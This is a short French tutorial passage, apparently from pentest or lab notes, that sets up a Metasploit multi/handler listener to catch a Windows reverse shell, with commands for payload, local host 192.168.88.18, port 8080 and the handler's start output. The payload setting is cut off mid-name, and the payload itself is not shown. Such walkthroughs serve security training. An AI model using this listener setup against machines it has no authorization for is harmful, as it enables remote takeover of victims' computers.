## Preparation Du Reverse shell

Lancer Metasploit avec `msfconsole -q`

```bash
msf6 > use exploit/multi/handler
```

```bash
msf6 exploit(multi/handler) > set payload windows/x64/
```

Definir le Host Local :

```bash
msf6 exploit(multi/handler) > set lhost 192.168.88.18
```

Definir le Port Local d'écoute :

```bash
msf6 exploit(multi/handler) > set lport 8080
```

Débuter l'écoute :

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.88.18:8080
```

Il faut maintenant attendre que notre Payload s'execute sur le PC cible.
